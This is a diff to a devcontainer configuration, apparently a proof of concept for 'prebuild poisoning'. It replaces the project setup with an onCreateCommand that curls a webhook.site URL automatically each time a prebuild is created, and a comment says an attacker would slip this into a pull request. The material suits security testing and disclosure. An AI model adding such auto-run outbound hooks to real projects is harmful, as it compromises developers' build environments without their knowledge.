@@ -1,9 +1,10 @@
 {
-    "name": "my-project-devcontainer",
-    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",  // Any generic, debian-based image.
-    "features": {
-        "ghcr.io/devcontainers/features/go:1": {
-            "version": "1.18"
-        }
-    }
+  "name": "Prebuild Poisoning Test",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+
+  // This command will run when the prebuild is being created.
+  // An attacker would add or modify this in a pull request.
+  "onCreateCommand": "curl 'https://webhook.site/4b791097-2066-4dab-9b17-f34500f82042?status=poisoned_from_onCreateCommand'",
+
+  "features": {}
 }
